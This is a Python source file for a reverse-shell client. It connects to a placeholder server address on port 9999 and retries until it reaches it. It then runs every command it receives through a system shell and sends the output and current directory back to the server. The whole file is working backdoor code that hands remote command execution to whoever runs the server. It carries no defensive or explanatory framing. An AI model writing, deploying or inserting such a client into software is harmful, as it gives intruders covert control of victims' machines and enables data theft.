import sys,os,socket,subprocess

host = 'SERVER_IP_ADDRESS'
port = 9999

class Client:
    def __init__(self):
        try:
            self.__createSocket()
            while self.__createConnection():continue
            self.__executable()
        except Exception as error:
            print(f'ERROR:={error}')
            sys.exit()

    def __createSocket(self):
        try:
            self.__client = socket.socket()
        except socket.error as error:
            print(f'Socket creation error := {error}')
            raise error

    def __createConnection(self):
        try:
            self.__client.connect((host,port))
            print(f'Successfully established connection to:= {host}:{port}!')
        except socket.error as error:
            print(f'Connection Error:={error}')
            print("Retrying...")
            return True
        except Exception as error:
            raise error

    def __closeSocket(self):
        print('Server closed...')
        self.__client.close()
        sys.exit()

    def __executable(self):
        while True:
            try:
                result = ""
                command_bytes = self.__client.recv(4096)
                command = command_bytes.decode('utf-8')
                if command == ' ':
                    self.__client.sendall(str.encode(' '))
                    continue
                elif len(command) == 0:
                    continue
                ##Non-empty commands
                if command[:2] == 'cd':
                    os.chdir(command[3:])
                else:
                    shellResponse = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                    shellOutput = str(shellResponse.stdout.read(),'utf-8')
                    shellError= str(shellResponse.stderr.read(),'utf-8')
                    result+=shellOutput + shellError + '\n'
                cwd = os.getcwd()
                result += cwd
                self.__client.sendall(result.encode())
                print(f'Command executed:{command}\n')
            except Exception as error:
                print("Server connection broken")
                raise error

def main():
    Client()
    
if __name__ == "__main__":
    main()